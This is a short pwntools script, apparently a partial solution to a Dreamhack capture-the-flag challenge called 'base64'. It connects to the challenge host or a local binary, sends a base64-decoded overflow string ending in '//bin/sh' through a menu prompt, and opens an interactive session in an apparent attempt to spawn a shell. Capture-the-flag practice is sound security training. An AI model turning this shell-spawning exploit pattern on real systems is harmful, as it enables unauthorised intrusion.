from pwn import *
import base64
elf = ELF('/home/kali/Downloads/dreamhack/base64/deploy/chall')
p=elf.process()

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:13333'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#sa vdm ce facem cu aia 64 bytes

def b64specific(string):
    encoded = string.encode('utf-8')
    decoded = base64.b64decode(encoded)
    return decoded

def sendb64(bytez):
    p.recvuntil(b"> ")
    p.sendline(b'1') 
    p.send(bytez)

test = b64specific('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP//bin/sh')
sendb64(test)
#gdb.attach(p)

p.interactive()
